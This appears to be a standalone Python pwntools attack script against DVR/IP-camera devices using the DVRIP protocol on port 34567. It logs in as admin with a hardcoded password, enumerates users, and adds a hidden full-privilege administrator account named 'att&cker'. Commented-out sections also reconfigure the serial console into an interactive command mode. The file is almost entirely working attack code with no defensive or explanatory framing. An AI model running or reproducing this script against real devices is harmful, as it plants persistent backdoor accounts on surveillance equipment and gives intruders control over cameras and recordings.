#! /usr/bin/python3
# -*- coding:utf-8 -*-


#from scapy.all import *

#payload  = "\xff"
#payload += "\x00"
#payload += "\x00"
#payload += "\x00"
#payload += "\x08\x00\x00\x00"
#payload += "\x26\x00\x00\x00"
#payload += "\x00"
#payload += "\x00"
#payload += "\xc0\x05"
#payload += "\x00\x00\x00\x00"
#
#packet = IP(src='192.168.0.103',dst='192.168.0.101')
#packet = packet/TCP(sport=1027, dport=34567, seq= ,ack= , flags="P")
#packet = packet/payload
#packet.payload.payload.load = packet.payload.payload.load.replace(b"\xc3\xbf",b"\xff").replace(b"\xc3\x80",b"\xc0")
#sr1(packet)


from pwn import *
import binascii

context.log_level = "debug"


io = remote(b"192.168.0.100",34567)


payload  = binascii.unhexlify(b"ff000000") # version
payload += binascii.unhexlify(b"9f860100") # session_id
payload += binascii.unhexlify(b"00000000") # seq_num: add one each time
payload += binascii.unhexlify(b"6300")     # packet_num: total_packet and current_packet
payload += binascii.unhexlify(b"8505")     # message_id: function code
payload += binascii.unhexlify(b"bf000000") # data_length: length of payload
payload += b'{ "Name" : "OPMonitor", "OPMonitor" : { "Action" : "Claim", "Parameter" : { "Channel" : 0, "CombinMode" : "CONNECT_ALL", "StreamType" : "Main", "TransMode" : "TCP" } }, "SessionID" : "0x1" }\n'
io.send(payload)


# login
io.recvuntil(b'"SessionID" : "0x0001869F"')
data = b'{ "CommunicateKey" : "", "EncryptType" : "MD5", "LoginType" : "DVRIP-Web", "PassWord" : "3mI4t81T", "UserName" : "admin" }\n'
payload  = binascii.unhexlify(b"ff000000")
payload += binascii.unhexlify(b"00000000")
payload += binascii.unhexlify(b"00000000")
payload += binascii.unhexlify(b"0000")
payload += binascii.unhexlify(b"e803")
payload += binascii.unhexlify('{:08x}'.format(len(data)))[::-1]
payload += data
io.send(payload)


# login successfully and get session_id
io.recvuntil(b'"SessionID" : "')
sess_id = io.recv(10)
seq_num = 0


# get existing users
payload  = binascii.unhexlify(b"ff000000") # version
payload += binascii.unhexlify(sess_id[2:])[::-1] # session_id
payload += binascii.unhexlify('{:08x}'.format(seq_num))[::-1] # seq_num
payload += binascii.unhexlify(b"0000") # packet_num
payload += binascii.unhexlify(b"c005") # message_id: USERS_GET
payload += binascii.unhexlify(b'00000000') # data_length
io.send(payload)


io.recvuntil(b'true } ] }\n\x00')


# add new users
data = b'{ "Name" : "System.ExUserMap", "SessionID" : "'+sess_id+b'", "System.ExUserMap" : { "User" : [ { "AuthorityList" : [ "ShutDown", "ChannelTitle", "RecordConfig", "Backup", "StorageManager", "Account", "SysInfo", "QueryLog", "DelLog", "SysUpgrade", "AutoMaintain", "TourConfig", "TVadjustConfig", "GeneralConfig", "EncodeConfig", "CommConfig", "NetConfig", "AlarmConfig", "VideoConfig", "PtzConfig", "PTZControl", "DefaultConfig", "Talk_01", "IPCCamera", "ImExport", "Monitor_01", "Replay_01" ], "Group" : "admin", "Memo" : "attacker added!", "Name" : "att&cker", "Password" : "0407MTIz2DUN", "Reserved" : false, "Sharable" : true } ], "UserNum" : 1 } }\n'
seq_num += 1
payload  = binascii.unhexlify(b"ff000000") # version
payload += binascii.unhexlify(sess_id[2:])[::-1] # session_id
payload += binascii.unhexlify('{:08x}'.format(seq_num))[::-1] # seq_num
payload += binascii.unhexlify(b"0000") # packet_num
payload += binascii.unhexlify(b"ca05") # message_id: add user request
payload += binascii.unhexlify('{:08x}'.format(len(data)))[::-1] # data_length
payload += data
io.send(payload)

io.recvuntil(b'"Ret" : 100')

# verify users
seq_num += 1
payload  = binascii.unhexlify(b"ff000000") # version
payload += binascii.unhexlify(sess_id[2:])[::-1] # session_id
payload += binascii.unhexlify('{:08x}'.format(seq_num))[::-1] # seq_num
payload += binascii.unhexlify(b"0000") # packet_num
payload += binascii.unhexlify(b"c005") # message_id: USERS_GET
payload += binascii.unhexlify(b'00000000') # data_length
io.send(payload)


'''
data = b'{ "Name" : "SystemInfo", "SessionID" : "'+sess_id+b'" }\n'
payload  = binascii.unhexlify(b"ff000000")
payload += binascii.unhexlify(sess_id[2:])[::-1]
payload += binascii.unhexlify(b"00000000")
payload += binascii.unhexlify(b"0000")
payload += binascii.unhexlify(b"fc03")
payload += binascii.unhexlify('{:08x}'.format(len(data)))[::-1] # data_length
payload += data
io.send(payload)
'''



### set Uart function ###
'''
# get Console configuration
data = b'{ "Name" : "Uart.Comm", "SessionID" : "'+sess_id+b'" }\n'
payload  = binascii.unhexlify(b"ff000000") # version
payload += binascii.unhexlify(sess_id[2:])[::-1] # session_id
payload += binascii.unhexlify('{:08x}'.format(seq_num))[::-1] # seq_num
payload += binascii.unhexlify(b"0000") # packet_num
payload += binascii.unhexlify(b"1204") # message_id
payload += binascii.unhexlify('{:08x}'.format(len(data)))[::-1] # data_length
payload += data
io.send(payload)

# set Console Configuration
io.recvuntil(b'"Name" : "Uart.Comm"')
result = io.recvuntil(b'\x20\x7d\x0a\x00')
cmd = [b'InteractCmd',b'GPS']
if cmd[0] in result:
	mode = cmd[1]
else:
	mode = cmd[0]
seq_num += 1
data = b'{ "Name" : "Uart.Comm", "SessionID" : "0x14", "Uart.Comm" : [ { "Attribute" : [ 115200, "None", 8, 1 ], "PortNo" : 1, "ProtocolName" : "'+mode+b'" }, { "Attribute" : [ 115200, "None", 8, 1 ], "PortNo" : 1, "ProtocolName" : "NONE" } ] }\n'
payload  = binascii.unhexlify(b"ff000000") # version
payload += binascii.unhexlify(sess_id[2:])[::-1] # session_id
payload += binascii.unhexlify('{:08x}'.format(seq_num))[::-1] # seq_num
payload += binascii.unhexlify(b"0000") # packet_num
payload += binascii.unhexlify(b"1004") # message_id
payload += binascii.unhexlify('{:08x}'.format(len(data)))[::-1] # data_length
payload += data
io.send(payload)


# verify Console configuration change
io.recvuntil(b'"Name" : ""')
seq_num += 1
data = b'{ "Name" : "Uart.Comm", "SessionID" : "'+sess_id+b'" }\n'
payload  = binascii.unhexlify(b"ff000000") # version
payload += binascii.unhexlify(sess_id[2:])[::-1] # session_id
payload += binascii.unhexlify('{:08x}'.format(seq_num))[::-1] # seq_num
payload += binascii.unhexlify(b"0000") # packet_num
payload += binascii.unhexlify(b"1204") # message_id
payload += binascii.unhexlify('{:08x}'.format(len(data)))[::-1] # data_length
payload += data
io.send(payload)
'''

'''
io.recvuntil(b'"VideoOutChannel" : 1 } }')
data = b'{ "BrowserLanguage" : { "BrowserLanguageType" : 1 }, "Name" : "BrowserLanguage", "SessionID" : "'+sess_id+b'" }\n'
payload = binascii.unhexlify(b"ff000000")
payload += binascii.unhexlify(sess_id[2:])[::-1]
payload += binascii.unhexlify(b"01000000")
payload += binascii.unhexlify(b"0000")
payload += binascii.unhexlify(b"1004")
payload += binascii.unhexlify('{:08x}'.format(len(data)))[::-1] # data_length
payload += data
io.send(payload)
'''


io.interactive()